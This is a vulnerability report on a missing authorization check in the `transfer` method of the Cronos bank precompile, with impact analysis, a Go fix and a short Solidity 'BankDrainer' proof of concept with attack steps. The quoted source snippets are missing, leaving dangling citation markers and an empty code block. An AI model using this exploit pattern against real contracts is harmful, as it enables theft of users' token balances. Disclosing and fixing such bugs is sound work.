### Title
Unauthorized Transfer of Native EVM-Denom Assets via Unguarded `transfer` in Bank Precompile - (File: `x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `transfer` method of the `BankContract` precompile accepts a caller-supplied `sender` address and executes `bankKeeper.SendCoins` from that address without verifying that the EVM caller (`contract.Caller()`) is authorized to move funds on behalf of `sender`. Any unprivileged EVM contract can drain any victim's native balance of the denom `evm/<calling_contract_address>` by supplying an arbitrary `sender`.

---

### Finding Description

``` [1](#0-0) 

`sender` (i.e., `from`) is taken verbatim from the ABI-decoded call arguments. There is no check that `contract.Caller() == sender`, no allowance/approval mechanism, and no other authorization guard. The only restriction is `checkBlockedAddr(to)`, which only protects module accounts from *receiving* funds. [2](#0-1) 

Compare this with the CRC21 contract, where the analogous `transfer_by_cronos_module` function explicitly enforces `require(msg.sender == module_address)` before performing an unsafe transfer: [3](#0-2) 

No such guard exists in the precompile's `transfer` path.

---

### Impact Explanation

**Critical — Unauthorized transfer of native EVM-denom assets.**

The denom transferred is `evm/<contract.Caller().Hex()>`. Any EVM contract can call the bank precompile at address `0x0000…0064` and invoke `transfer(victim, attacker, amount)`. The precompile will execute `bankKeeper.SendCoins(ctx, victim, attacker, coins)` unconditionally, moving the victim's entire native balance of that denom to the attacker.

Affected assets include native Cosmos bank-module balances of `evm/…` denoms, which are the backing representation of CRC20/CRC21 tokens used in the Cronos bridge and IBC flows. Users who hold such balances (e.g., after a token conversion or IBC receive) are fully exposed.

The `burn` case has a symmetric issue — `args[0]` is burned from without authorization — but `transfer` is the higher-impact path because it enables theft rather than mere destruction. [4](#0-3) 

---

### Likelihood Explanation

The bank precompile is reachable by any EVM transaction. An attacker needs only to deploy a contract (or use an EOA via a raw call) that calls address `0x0000…0064` with the `transfer` selector and the victim's address as `sender`. No privileged access, leaked keys, or governance action is required. The attack is a single transaction.

---

### Recommendation

Add an authorization check in the `TransferMethodName` case that enforces `contract.Caller() == sender` (i.e., a contract may only transfer tokens *it* owns, not tokens belonging to an arbitrary third party):

```go
if contract.Caller() != sender {
    return nil, errors.New("transfer: caller is not the sender")
}
```

Alternatively, if delegated transfers are intentional, implement an EVM-level allowance mechanism (analogous to ERC-20 `approve`/`transferFrom`) before permitting third-party transfers. The same fix should be applied to the `burn` case, where `args[0]` is burned from without verifying the caller's authority over that address. [1](#0-0)

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    // transfer(address sender, address recipient, uint256 amount) → bool
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract BankDrainer {
    // Bank precompile is at address 0x0000...0064 (bytes{100})
    IBankPrecompile constant BANK = IBankPrecompile(address(100));

    // Attacker calls this once to drain victim's entire balance of
    // denom "evm/<address(this)>" from the Cosmos bank module.
    function drain(address victim, address attacker, uint256 amount) external {
        // No approval from victim required.
        // contract.Caller() == address(this), so denom = "evm/<this>"
        BANK.transfer(victim, attacker, amount);
    }
}
```

1. Attacker deploys `BankDrainer` at address `A`.
2. Victim holds a native balance of denom `evm/0x<A>` (e.g., received via IBC or token conversion).
3. Attacker calls `BankDrainer.drain(victim, attacker, victimBalance)`.
4. The precompile executes `bankKeeper.SendCoins(ctx, victim, attacker, coins)` with no authorization check.
5. Victim's balance is transferred to the attacker in a single transaction. [5](#0-4)
